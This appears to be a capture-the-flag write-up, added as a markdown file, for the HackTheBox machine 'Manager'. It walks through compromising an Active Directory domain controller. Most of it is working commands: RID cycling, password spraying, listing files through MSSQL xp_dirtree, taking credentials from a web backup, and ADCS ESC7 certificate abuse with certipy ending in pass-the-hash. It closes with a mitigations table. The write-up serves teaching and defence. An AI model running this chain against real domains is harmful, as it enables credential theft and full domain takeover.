@@ -1,0 +1,204 @@
+---
+title: "Manager"
+platform: "HackTheBox"
+os: "Windows"
+difficulty: "Medium"
+date: 2026-10-19
+ports: ["53/dns", "80/http", "88/kerberos", "389/ldap", "445/smb", "636/ldaps", "1433/mssql", "3268/gc", "5985/winrm", "9389/adws"]
+tags: ["active-directory", "adcs", "esc7", "mssql", "certipy", "rid-brute", "password-spray", "pass-the-hash"]
+summary: "An Active Directory DC compromised end to end: anonymous enumeration via RID cycling, password spraying for an MSSQL foothold, a forgotten website backup with LDAP credentials, and escalation to Domain Admin by abusing permissions over the ADCS CA (ESC7)."
+---
+
+## Summary
+
+Manager is a Windows machine modelling a Domain Controller with a misconfigured Active Directory PKI. The full chain was:
+
+1. **Anonymous enumeration** of the domain via RID cycling to get a list of valid users.
+2. **Password spraying** (user = lowercase name) that revealed the `Operator:operator` credentials.
+3. With that user, read-only access to **MSSQL**, used as a lateral channel to **list the filesystem** (`xp_dirtree`) and discover a **website backup** forgotten in the IIS root.
+4. The backup held an LDAP config file with **Raven**'s clear-text credentials.
+5. Raven had the **`ManageCa`** permission over the Certificate Authority → escalation to Administrator via **ADCS ESC7**.
+
+<Callout type="note">
+The machine's central pattern: a channel that gives **read/list** but not execution (MSSQL as `guest`) is still exploitable — you use it to *discover* and collect the loot through the most convenient channel (HTTP).
+</Callout>
+
+## Reconnaissance
+
+The port scan paints a textbook Domain Controller: DNS (53), Kerberos (88), LDAP (389/636), SMB (445), Global Catalog (3268/3269) and ADWS (9389). Plus three juicy vectors: IIS (80), MSSQL 2019 (1433) and WinRM (5985).
+
+```bash
+nmap -p- --min-rate 5000 -sS <IP>
+nmap -p53,80,88,135,139,389,445,593,636,1433,3268,3269,5985,9389 -sCV <IP>
+```
+
+Key facts from the service scan:
+
+- **Domain:** `manager.htb` — **DC FQDN:** `dc01.manager.htb`
+- **OS:** Windows Server 2019 (build 17763)
+- **MSSQL 2019 RTM** unpatched on 1433
+- **IIS 10.0** web with title "Manager" on 80
+
+```bash
+echo "<IP> manager.htb dc01.manager.htb dc01" | sudo tee -a /etc/hosts
+```
+
+### User enumeration (RID cycling)
+
+RID brute over SMB/LSA returned `STATUS_ACCESS_DENIED`, but the machine accepts authentication with any user and an empty password (guest-style null session). `impacket-lookupsid` does RID cycling over a different channel and does work:
+
+```bash
+impacket-lookupsid 'manager.htb/guest@dc01.manager.htb' -no-pass
+```
+
+Real users obtained (RIDs 1113+): `Zhong`, `Cheng`, `Ryan`, `Raven`, `JinWoo`, `ChinHae`, `Operator`.
+
+<Callout type="tip">
+If RID brute over SMB gives `ACCESS_DENIED`, don't give up: `impacket-lookupsid` attacks the cycling via MS-LSAT/SAMR over a different binding and often answers when the LSA channel is locked down.
+</Callout>
+
+## Foothold
+
+### Password spraying
+
+AS-REP roasting gave nothing (no user with preauth disabled) and the `user=User` spray failed. But trying the name **in lowercase** landed a hit:
+
+```bash
+tr '[:upper:]' '[:lower:]' < users.txt > users_lower.txt
+nxc smb dc01.manager.htb -u users.txt -p users_lower.txt --no-bruteforce --continue-on-success
+# [+] manager.htb\Operator:operator
+```
+
+### MSSQL as a discovery channel
+
+`Operator` can authenticate to MSSQL, but only as `guest` (no sysadmin), so `xp_cmdshell` is off the table. It can, however, **list the disk** with `xp_dirtree`:
+
+```bash
+impacket-mssqlclient manager.htb/Operator:operator@dc01.manager.htb -windows-auth
+```
+
+```sql
+EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1;
+```
+
+The listing revealed a file that has no business on a public site:
+
+```text
+website-backup-27-07-23-old.zip
+```
+
+Being in `C:\inetpub\wwwroot\` (the root IIS serves), it's downloaded directly over HTTP:
+
+```bash
+wget http://manager.htb/website-backup-27-07-23-old.zip
+unzip website-backup-27-07-23-old.zip -d backup
+```
+
+Inside, a hidden `.old-conf.xml` with clear-text LDAP credentials:
+
+```xml
+<user>raven@manager.htb</user>
+<password>********************</password>
+```
+
+<Callout type="warning">
+Website backups keep secrets the live site no longer exposes. Always check hidden files (`ls -la`) and grep for `password|pwd|connectionstring` across all the extracted content.
+</Callout>
+
+Raven's credentials validate against WinRM → shell and **user flag**:
+
+```bash
+evil-winrm -i dc01.manager.htb -u raven -p '<password>'
+```
+
+## Privilege escalation
+
+### Diagnosis: ADCS
+
+`whoami /all` on Raven shows membership in `BUILTIN\Certificate Service DCOM Access` → there's a CA in the domain and Raven interacts with it. `certipy find` flagged no vulnerable templates, so the flaw is in the **CA itself**: reading the `CA Permissions` section raw shows
+
+```text
+ManageCa : ... MANAGER.HTB\Raven
+```
+
+This is **ESC7**: a principal with administrative permissions over the Certificate Authority.
+
+<Callout type="tip">
+Don't rely on Certipy's `-vulnerable` flag alone. ESC7 depends on CA ACLs that the automatic filter sometimes doesn't label — you must always read the `CA Permissions` section by hand.
+</Callout>
+
+### The ESC7 chain
+
+Raven has `ManageCa` but not `ManageCertificates`. Each step enables the next, until a permission over the CA becomes the Administrator's hash:
+
+<AttackChain
+  tag="ESC7"
+  label="from ManageCa to Domain Admin"
+  steps={[
+    { title: 'Raven · ManageCa', desc: 'Administrative permission over the Certificate Authority.', action: 'certipy ca -add-officer raven' },
+    { title: '+ ManageCertificates', desc: 'As ManageCa can appoint officers, Raven self-grants the permission to issue.', action: 'certipy ca -enable-template SubCA' },
+    { title: 'SubCA template enabled', desc: 'The template lets you specify an arbitrary SAN (impersonate anyone).', action: 'certipy req -upn administrator@manager.htb' },
+    { title: 'Request #ID · PENDING', desc: 'It returns TEMPLATE_DENIED and stays pending. Note the Request ID.', tone: 'pending', action: 'certipy ca -issue-request <ID>   (already an officer)' },
+    { title: 'Certificate issued', desc: 'The request is approved and administrator.pfx is collected with -retrieve.', action: 'certipy auth -pfx   ·   PKINIT + UnPAC-the-hash' },
+    { title: 'Administrator NT hash', desc: 'The certificate is the admin\'s identity: PKINIT returns their TGT and hash.', action: 'pass-the-hash   ·   evil-winrm -H' },
+    { title: 'Domain Admin', desc: 'Shell as Administrator. Full domain compromise.', tone: 'win' },
+  ]}
+/>
+
+The chain's commands, in order:
+
+```bash
+# 1. ManageCa lets you appoint officers → self-grant ManageCertificates
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -add-officer raven
+
+# 2. Enable the SubCA template (allows an arbitrary SAN)
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -enable-template SubCA
+
+# 3. Request a cert as administrator → stays PENDING (TEMPLATE_DENIED). Note the Request ID
+certipy-ad req -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -target dc01.manager.htb \
+  -template SubCA -upn administrator@manager.htb
+
+# 4. Approve the pending request (already an officer)
+certipy-ad ca -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -issue-request <ID>
+
+# 5. Retrieve the issued certificate → administrator.pfx
+certipy-ad req -u raven@manager.htb -p '<password>' -dc-ip <IP> \
+  -ca manager-DC01-CA -target dc01.manager.htb -retrieve <ID>
+```
+
+<Callout type="warning">
+The order is non-negotiable: `add-officer` **must** come before `issue-request`, or the approval fails with `Access denied: Insufficient permissions to issue certificate`. Each step enables the next.
+</Callout>
+
+### Final Pass-the-Hash
+
+The `.pfx` with UPN `administrator@manager.htb` **is** the admin's identity. Via PKINIT you get their TGT and, with UnPAC-the-hash, their NT hash:
+
+```bash
+sudo ntpdate dc01.manager.htb          # PKINIT is pure Kerberos: clock skew breaks it
+certipy-ad auth -pfx administrator.pfx -dc-ip <IP>
+# [*] Got hash for 'administrator@manager.htb': aad3b435...:<NT_HASH>
+
+evil-winrm -i dc01.manager.htb -u administrator -H <NT_HASH>
+```
+
+Shell as Administrator → **root flag**. Machine owned.
+
+<Callout type="note">
+In AD with PKINIT, a certificate replaces the password as proof of identity. "Being able to request a certificate" becomes "being able to be anyone" — which is why a misconfigured PKI is so lethal.
+</Callout>
+
+## Lessons and mitigations
+
+| Flaw | Impact | Mitigation |
+|-------|---------|------------|
+| Anonymous RID cycling enabled | Full enumeration of domain users | Restrict null sessions; harden `RestrictAnonymous` |
+| Trivial passwords (user = name) | Foothold via password spraying | Strong password policy; spraying detection |
+| Backup with credentials in the web root | Raven's clear-text credentials | Don't leave backups in served directories; rotate leaked secrets |
+| Clear-text credentials in LDAP config | Direct reuse | Service accounts with managed secrets (gMSA / vault) |
+| `ManageCa` over the CA to a low-priv user (ESC7) | Direct escalation to Domain Admin | Review CA ACLs; limit officers; disable unused templates |
+| Certificates without strong SID binding | Impersonation via UPN | Apply KB5014754 (strong certificate mapping) |
